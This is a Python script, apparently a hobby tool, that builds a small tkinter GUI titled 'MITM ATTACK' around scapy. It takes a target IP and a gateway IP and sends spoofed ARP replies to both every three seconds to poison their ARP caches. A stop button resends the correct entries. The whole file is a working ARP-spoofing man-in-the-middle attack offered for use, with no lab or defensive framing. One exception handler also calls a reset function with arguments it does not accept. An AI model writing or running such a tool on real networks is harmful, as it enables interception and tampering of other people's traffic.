import scapy.all as scapy
import time
import optparse
import tkinter as tk
import threading

def get_mac_address(ip):  
    arp_request_packet = scapy.ARP(pdst=ip)
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined_packet = broadcast_packet / arp_request_packet
    answered_list = scapy.srp(combined_packet, timeout=1, verbose=False)[0]
    
    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        print("Cihaz bulunamadı veya yanıt vermedi.")
    
    
def arp_poisoning(target_ip, poisoned_ip):
    target_mac = get_mac_address(target_ip) 
    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=poisoned_ip)
    scapy.send(arp_response, verbose=False)




def reset_operation():
    fooled_ip = entry_targetip.get()
    gateway_ip = entry_gatewayip.get()

    fooled_mac = get_mac_address(fooled_ip)
    gateway_mac = get_mac_address(gateway_ip)

    arp_response = scapy.ARP(op=2, pdst=fooled_ip, hwdst=fooled_mac, psrc=gateway_ip, hwsrc=gateway_mac)
    scapy.send(arp_response, verbose=False, count=6)



is_attack_running = True


def perform_attack():
    
    global is_attack_running

    user_target_ip = entry_targetip.get()
    user_gateway_ip = entry_gatewayip.get()
    number = 0

    try:
        while is_attack_running:
            arp_poisoning(user_target_ip, user_gateway_ip)
            arp_poisoning(user_gateway_ip, user_target_ip)
            number += 2
            print("\rSending packets " + str(number), end="")
            time.sleep(3)
    except KeyboardInterrupt:
        print("\nQuit & Reset")
        reset_operation(user_target_ip, user_gateway_ip)
        reset_operation(user_gateway_ip, user_target_ip)


def start_attack():
    global attack_thread
    attack_thread = threading.Thread(target=perform_attack)
    attack_thread.start()



def stop_attack():
    global is_attack_running
    is_attack_running = False
    reset_operation()



def on_closing():
    
    global is_attack_running
    is_attack_running = False
    root.destroy()

root = tk.Tk()
root.title("MITM ATTACK")
root.geometry("300x200")
root.protocol("WM_DELETE_WINDOW", on_closing)

label = tk.Label(root, text="Target IP")
label.pack(pady=10)
entry_targetip = tk.Entry(root)
entry_targetip.pack()

label2 = tk.Label(root, text="Gateway IP")
label2.pack(pady=10)
entry_gatewayip = tk.Entry(root)
entry_gatewayip.pack()

attack_button = tk.Button(root, text="Attack", command=start_attack)
attack_button.pack(side=tk.LEFT, padx=5, pady=5)

stop_button = tk.Button(root, text="Stop&Reset", command=stop_attack)
stop_button.pack(side=tk.LEFT, padx=5, pady=5)



root.mainloop()
